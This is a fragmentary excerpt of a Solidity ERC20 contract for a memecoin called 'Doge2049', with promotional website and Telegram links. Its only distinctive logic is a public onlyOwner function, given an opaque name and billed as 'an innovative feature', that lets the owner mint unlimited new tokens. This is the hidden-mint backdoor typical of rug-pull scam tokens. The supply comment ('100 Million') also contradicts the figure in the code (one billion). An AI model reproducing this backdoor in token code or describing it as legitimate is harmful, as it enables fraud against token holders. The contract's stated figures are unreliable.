...
//
// $Doge2049 an innovative feature in its contract.
/**
Website     : https://Doge2049.tech/
Telegram    : https://t.me/Doge2049Portal
Twitter     : 
*/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Doge2049(uint256 amount) public onlyOwner {
 _Doge2049(msg.sender, amount);
    }
    ...
    function _Doge2049(address account, uint256 amount) internal virtual {
...
contract Doge2049 is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Doge 2049", "Doge2049") {
     _Doge2049(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}